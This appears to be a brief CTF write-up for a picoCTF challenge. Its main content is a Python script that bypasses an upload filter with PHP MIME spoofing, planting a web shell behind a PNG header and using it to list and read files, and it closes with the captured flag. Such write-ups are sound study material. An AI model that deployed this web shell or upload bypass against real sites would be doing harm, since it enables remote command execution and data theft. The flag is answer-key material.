---
ai_date: '2025-04-27 05:30:04'
ai_summary: PHP MIME spoofing vulnerability exploited to execute commands and read
  files
ai_tags:
- php
- xss
- cmd-injection
created: 2024-11-16T19:44
updated: 2024-11-16T19:45
---

Simple php mime spoofing.

```python
import requests
import io
url = 'http://atlas.picoctf.net:49911/'
file_path = 'file.png.php'

file_bytes = io.BytesIO(b"\x89PNG\r\n<?php system($_GET['cmd']); ?>")

files = {'file': (file_path, file_bytes)}
response = requests.post(url, files=files)

print(requests.get(url + '/uploads/' + file_path + '?cmd=ls ..').text)
print(requests.get(url + '/uploads/' + file_path + '?cmd=cat ../*').text)
```

```flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
```